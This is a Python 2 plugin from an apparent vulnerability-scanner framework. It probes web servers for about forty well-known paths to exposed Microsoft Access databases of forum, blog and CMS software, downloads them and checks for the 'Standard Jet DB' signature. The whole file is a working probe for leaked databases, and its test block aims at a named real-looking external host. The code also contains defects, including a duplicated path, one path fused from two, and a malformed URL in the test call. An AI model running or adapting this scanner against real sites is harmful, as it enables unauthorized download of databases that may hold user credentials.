from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payloads = [
        'database/PowerEasy4.mdb',
        'database/PowerEasy5.mdb',
        'database/PowerEasy6.mdb',
        'database/PowerEasy2005.mdb',
        'database/PowerEasy2006.mdb',
        'database/PE_Region.mdb',
        'data/dvbbs7.mdb',
        'databackup/dvbbs7.mdb',
        'bbs/databackup/dvbbs7.mdb',
        'data/zm_marry.asp',
        'databackup/dvbbs7.mdb',
        'admin/data/qcdn_news.mdb',
        'firend.mdb',
        'database/newcloud6.mdb',
        'database/%23newasp.mdb',
        'blogdata/L-BLOG.mdb',
        'blog/blogdata/L-BLOG.mdb',
        'database/bbsxp.mdb',
        'bbs/database/bbsxp.mdb',
        'access/sf2.mdb',
        'data/Leadbbs.mdb',
        'bbs/Data/LeadBBS.mdb',
        'bbs/access/sf2.mdb',
        'fdnews.asp',
        'bbs/fdnews.asp',
        'admin/ydxzdate.asa',
        'data/down.mdb',
        'data/db1.mdb',
        'database/Database.mdb',
        'db/xzjddown.mdb',
        'admin/data/user.asp',
        'data_jk/joekoe_data.asp',
        'data/news3000.asp',
        'data/appoen.mdb',
        'data/12912.asp',
        'database.asp',
        'download.mdb',
        'dxxobbs/mdb/dxxobbs.mdb',
        'db/6k.asp',
        'database/snowboy.mdb',
        'database/%23mmdata.mdb',
        'editor/db/ewebeditor.mdbeWebEditor/db/ewebeditor.mdb',
        ]
        for payload in payloads:
            url = arg + payload
            code, head, body, error, _ = curl.curl('--max-filesize 1024000 '+url)
            if code == 200 and 'Standard Jet DB' in body:
                output(url,result,'hole')
                break
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  iis  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='db Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/middle/iis/iis_9302267e7026e957e78f0860b94f3fc9.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_9302267e7026e957e78f0860b94f3fc9.py
#/root/github/poccreate/codesrc/exp-689.py